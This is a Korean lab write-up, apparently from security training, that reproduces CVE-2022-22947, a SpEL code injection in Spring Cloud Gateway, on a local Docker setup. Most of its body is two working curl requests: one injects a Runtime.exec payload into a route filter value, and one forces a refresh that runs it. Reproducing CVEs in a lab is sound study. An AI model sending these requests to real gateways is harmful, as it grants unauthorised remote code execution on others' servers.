# Spring Cloud Gateway Code Injection vulnerability (CVE-2022-22947)
화이트햇 스쿨 3기 - [박정원(no1pjw)](https://github.com/no1pjw)
## 요약
Spring Cloud Gateway는 SpEL 표현식을 사용하며 Spring Cloud Gateway 모듈 중 getValue 메서드는  StandardEvaluationContext를 사용해 모든 유효한 SpEL 표현식을 처리하는데, SpEL을 처리하는 과정에서 입력에 대한 검사가 존재하지 않아, 임의 코드를 실행하는 SpEL을 전달할 수 있음.

## 환경 구성 및 실행
```bash
docker compose up -d
```
docker compose up -d를 실행합니다. 
실행한 뒤에는 localhost:8080/actuator/gateway/routes에 접속해서 잘 구성되었는지 확인합니다.

![image](https://github.com/user-attachments/assets/3ccdc907-349b-4271-8166-e21ae088ff6d)

그 후, value에 악의적인 코드를 넣어 새로운 루트를 만드는 요청을 전송합니다.
```bash
curl -v -X POST http://localhost:8080/actuator/gateway/routes/hacktest \
  -H "Content-Type: application/json" \
  -d '{
    "id": "hacktest",
    "filters": [{
      "name": "AddResponseHeader",
      "args": {
        "name": "Result",
        "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
      }
    }],
    "uri": "http://example.com"
  }'
```
그리고, 구성을 강제로 로드하기 위해 refresh에 POST 요청을 전송합니다.
```bash
curl -X POST http://localhost:8080/actuator/gateway/refresh \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Accept: */*" \
  -H "Accept-Language: en" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36" \
  -H "Connection: close" \
  --data ""
```
구성을 강제로 로드하기 위해 refresh에 POST 요청 전송

# 결과
![image](https://github.com/user-attachments/assets/f8a99e21-9b2b-4a3a-8796-c2ca81e8fdc2)

악의적인 동작이 실행되어서 의도치 않은 동작이 수행된 것을 확인할 수 있습니다.
